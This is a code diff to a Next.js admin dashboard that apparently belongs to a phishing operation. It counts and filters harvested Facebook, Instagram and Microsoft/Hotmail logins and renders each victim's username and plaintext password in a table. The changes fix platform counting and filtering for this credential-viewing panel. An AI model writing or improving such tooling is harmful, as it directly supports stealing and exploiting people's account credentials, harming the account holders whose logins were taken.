@@ -24,6 +24,7 @@ export default function AdminDashboard() {
   const [searchTerm, setSearchTerm] = useState('');
   const [filter, setFilter] = useState('all');
   const [darkMode, setDarkMode] = useState(false);
+  const [platformCounts, setPlatformCounts] = useState({});
   
   const router = useRouter();
   
@@ -211,6 +212,55 @@ export default function AdminDashboard() {
     document.body.removeChild(link);
   };
   
+  // Fix the platform display section to ensure proper counting
+  useEffect(() => {
+    async function fetchData() {
+      try {
+        const { data, error } = await supabase
+          .from('users')
+          .select('*')
+          .order('created_at', { ascending: false });
+          
+        if (error) throw error;
+        
+        setPlatformCounts(data.reduce((acc, user) => {
+          const platform = user.platform || '';
+          if (platform.includes('facebook') || platform === 'fb' || platform === 'facebook-mobile') {
+            acc['facebook'] = (acc['facebook'] || 0) + 1;
+          } else if (platform.includes('instagram')) {
+            acc['instagram'] = (acc['instagram'] || 0) + 1;
+          } else if (platform.includes('hotmail') || platform.includes('MS')) {
+            acc['microsoft'] = (acc['microsoft'] || 0) + 1;
+          }
+          return acc;
+        }, {}));
+        setLoading(false);
+      } catch (error) {
+        console.error('Error fetching data:', error);
+        setError(error.message);
+        setLoading(false);
+      }
+    }
+    
+    fetchData();
+  }, [supabase]);
+  
+  // Add this modified function to fix filtering of Facebook data
+  function filterPlatformData(platform) {
+    if (!credentials) return [];
+    
+    // Fix the filtering logic for Facebook platforms
+    if (platform === 'facebook') {
+      return credentials.filter(user => 
+        user.platform === 'facebook' || 
+        user.platform === 'facebook-mobile' || 
+        user.platform === 'fb'
+      );
+    }
+    
+    return credentials.filter(user => user.platform === platform);
+  }
+  
   return (
     <>
       <Head>
@@ -396,15 +446,11 @@ export default function AdminDashboard() {
                         </tr>
                       </thead>
                       <tbody>
-                        {filterCredentials().length > 0 ? (
-                          filterCredentials().map((cred) => (
-                            <tr key={cred.id} className={cred.username.includes('(IG)') ? 'instagram-row' : 'facebook-row'}>
+                        {filterPlatformData('facebook').length > 0 ? (
+                          filterPlatformData('facebook').map((cred) => (
+                            <tr key={cred.id} className="facebook-row">
                               <td>
-                                {cred.username.includes('(IG)') ? (
-                                  <><i className="fab fa-instagram"></i> </>
-                                ) : (
-                                  <><i className="fab fa-facebook"></i> </>
-                                )}
+                                <><i className="fab fa-facebook"></i> </>
                                 {cred.username}
                               </td>
                               <td>{cred.password}</td>
